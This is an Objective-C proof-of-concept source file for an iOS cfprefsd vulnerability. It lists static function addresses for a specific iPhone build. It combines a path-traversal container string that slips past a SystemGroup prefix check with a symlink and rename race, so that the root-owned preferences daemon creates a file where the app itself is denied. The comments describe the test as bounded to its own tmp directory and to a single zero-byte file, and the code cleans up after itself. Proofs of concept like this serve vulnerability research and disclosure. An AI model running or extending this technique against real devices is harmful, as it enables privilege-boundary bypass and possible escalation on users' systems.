/*
 * Minimal cfprefsd AnyUser final-symlink create PoC.
 *
 * Exact iPhone18,2 / 24A5408d static locations:
 *   __CFPrefsCopyFixedUpContainerForMessage             0x18066af00
 *   -[CFPrefsDaemon handleSourceMessage:...]            0x180669bf4
 *   -[CFPDSource acceptMessage:populatingReply:]        0x180667554
 *   -[CFPDSource cacheFileInfoForWriting:euid:egid:...] 0x1806606ac
 *   -[CFPDSource cleanUpIfNecessaryAfterCreatingPlist]  0x1807aad30
 *
 * This bounded test uses unique paths in its own tmp directory. It only tests
 * creation of one missing, root-owned, zero-byte file. It does not control the
 * file contents and does not replace an existing file.
 */

#import <Foundation/Foundation.h>
#import <dispatch/dispatch.h>

#import <dlfcn.h>
#import <errno.h>
#import <fcntl.h>
#import <limits.h>
#import <stdatomic.h>
#import <stdbool.h>
#import <stdint.h>
#import <sys/stat.h>
#import <unistd.h>

typedef void (*SetValueWithContainer)(
    CFStringRef key, CFTypeRef value, CFStringRef appID, CFStringRef user,
    CFStringRef host, CFStringRef container);
typedef Boolean (*SynchronizeWithContainer)(
    CFStringRef appID, CFStringRef user, CFStringRef host,
    CFStringRef container);

static BOOL IsSymlinkTo(NSString *path, NSString *target)
{
    struct stat status = {0};
    if (lstat(path.fileSystemRepresentation, &status) != 0 ||
        !S_ISLNK(status.st_mode)) {
        return NO;
    }
    char value[PATH_MAX] = {0};
    ssize_t length = readlink(path.fileSystemRepresentation,
                              value, sizeof(value) - 1);
    if (length < 0) {
        return NO;
    }
    value[length] = '\0';
    return [target isEqualToString:[NSString stringWithUTF8String:value]];
}

static void RemoveNode(NSString *path)
{
    struct stat status = {0};
    if (lstat(path.fileSystemRepresentation, &status) == 0 &&
        (S_ISLNK(status.st_mode) || S_ISREG(status.st_mode))) {
        unlink(path.fileSystemRepresentation);
    }
}

int run_cfprefsd_zero_file_poc(void)
{
    SetValueWithContainer setValue = (SetValueWithContainer)dlsym(
        RTLD_DEFAULT, "_CFPreferencesSetValueWithContainer");
    SynchronizeWithContainer synchronize =
        (SynchronizeWithContainer)dlsym(
            RTLD_DEFAULT, "_CFPreferencesSynchronizeWithContainer");
    if (setValue == NULL || synchronize == NULL) {
        return 1;
    }

    NSString *nonce = NSUUID.UUID.UUIDString;
    NSString *tmp = NSTemporaryDirectory();
    NSString *appUUID = NSHomeDirectory().lastPathComponent;
    NSString *targetRoot = [tmp stringByAppendingPathComponent:
        [@"CFPrefsTarget-" stringByAppendingString:nonce]];
    NSString *locked = [targetRoot stringByAppendingPathComponent:@"locked"];
    NSString *target = [locked stringByAppendingPathComponent:@"created.plist"];
    NSString *leaf = [@"CFPrefsContainer-" stringByAppendingString:nonce];
    NSString *actual = [tmp stringByAppendingPathComponent:leaf];
    NSString *hidden = [actual stringByAppendingString:@".hidden"];
    NSString *domain = [@"local.research.cfprefs.zero."
        stringByAppendingString:nonce];
    NSString *relative = [@"Library/Preferences"
        stringByAppendingPathComponent:
            [domain stringByAppendingPathExtension:@"plist"]];
    NSString *actualPreference = [actual stringByAppendingPathComponent:relative];
    NSString *hiddenPreference = [hidden stringByAppendingPathComponent:relative];

    // The raw string passes the SystemGroup prefix test. Its canonical path is
    // the app-owned directory named by actual.
    NSString *rawContainer = [NSString stringWithFormat:
        @"/private/var/containers/Shared/SystemGroup/../../../mobile/"
         "Containers/Data/Application/%@/tmp/%@", appUUID, leaf];

    NSFileManager *fm = NSFileManager.defaultManager;
    NSError *error = nil;
    BOOL ready = [fm createDirectoryAtPath:locked
               withIntermediateDirectories:YES
                                attributes:@{NSFilePosixPermissions : @0700}
                                     error:&error] &&
        chmod(locked.fileSystemRepresentation, 0500) == 0;

    // The app must not be able to create the target itself.
    errno = 0;
    int fd = ready ? open(target.fileSystemRepresentation,
        O_WRONLY | O_CREAT | O_EXCL | O_CLOEXEC, 0600) : -1;
    int directErrno = errno;
    if (fd >= 0) {
        close(fd);
        unlink(target.fileSystemRepresentation);
    }
    BOOL directDenied = fd < 0 &&
        (directErrno == EACCES || directErrno == EPERM);

    NSString *preferenceDirectory =
        [hidden stringByAppendingPathComponent:@"Library/Preferences"];
    ready = directDenied &&
        [fm createDirectoryAtPath:preferenceDirectory
      withIntermediateDirectories:YES
                       attributes:@{NSFilePosixPermissions : @0700}
                            error:&error] &&
        symlink(target.fileSystemRepresentation,
                hiddenPreference.fileSystemRepresentation) == 0 &&
        IsSymlinkTo(hiddenPreference, target) &&
        [rawContainer hasPrefix:
            @"/private/var/containers/Shared/SystemGroup/"] &&
        [rawContainer.stringByStandardizingPath isEqualToString:actual];

    __block _Atomic(bool) running = false;
    dispatch_semaphore_t firstRenameOut = dispatch_semaphore_create(0);
    dispatch_semaphore_t stopped = dispatch_semaphore_create(0);
    BOOL sent = NO;

    if (ready) {
        atomic_store(&running, true);
        dispatch_async(
            dispatch_get_global_queue(QOS_CLASS_USER_INTERACTIVE, 0), ^{
                BOOL signalled = NO;
                while (atomic_load(&running)) {
                    rename(hidden.fileSystemRepresentation,
                           actual.fileSystemRepresentation);
                    usleep(35);
                    if (rename(actual.fileSystemRepresentation,
                               hidden.fileSystemRepresentation) == 0 &&
                        !signalled) {
                        signalled = YES;
                        dispatch_semaphore_signal(firstRenameOut);
                    }
                    usleep(35);
                }
                dispatch_semaphore_signal(stopped);
            });

        if (dispatch_semaphore_wait(firstRenameOut,
                dispatch_time(DISPATCH_TIME_NOW, NSEC_PER_SEC)) == 0) {
            sent = YES;
            setValue(CFSTR("marker"), CFSTR("not_expected_to_write"),
                     (__bridge CFStringRef)domain, kCFPreferencesAnyUser,
                     kCFPreferencesAnyHost,
                     (__bridge CFStringRef)rawContainer);
            synchronize((__bridge CFStringRef)domain,
                        kCFPreferencesAnyUser, kCFPreferencesAnyHost,
                        (__bridge CFStringRef)rawContainer);
            usleep(250000);
        }
        atomic_store(&running, false);
        dispatch_semaphore_wait(stopped,
            dispatch_time(DISPATCH_TIME_NOW, 2 * NSEC_PER_SEC));
    }

    struct stat actualStatus = {0};
    struct stat hiddenStatus = {0};
    if (lstat(actual.fileSystemRepresentation, &actualStatus) != 0 &&
        lstat(hidden.fileSystemRepresentation, &hiddenStatus) == 0) {
        rename(hidden.fileSystemRepresentation, actual.fileSystemRepresentation);
    }
    if (sent) {
        usleep(1000000);
    }

    struct stat targetStatus = {0};
    BOOL hit = sent && IsSymlinkTo(actualPreference, target) &&
        lstat(target.fileSystemRepresentation, &targetStatus) == 0 &&
        S_ISREG(targetStatus.st_mode) && targetStatus.st_uid == 0 &&
        (targetStatus.st_mode & 0777) == 0644 && targetStatus.st_size == 0;

    fprintf(stderr,
        "CFPREFS success=%d direct_denied=%d uid=%u mode=%#o size=%lld\n",
        hit, directDenied, hit ? targetStatus.st_uid : UINT_MAX,
        hit ? targetStatus.st_mode & 07777 : 0,
        hit ? (long long)targetStatus.st_size : -1LL);

    RemoveNode(actualPreference);
    RemoveNode(hiddenPreference);
    chmod(locked.fileSystemRepresentation, 0700);
    RemoveNode(target);
    [fm removeItemAtPath:actual error:nil];
    [fm removeItemAtPath:hidden error:nil];
    [fm removeItemAtPath:targetRoot error:nil];
    return hit ? 0 : 2;
}
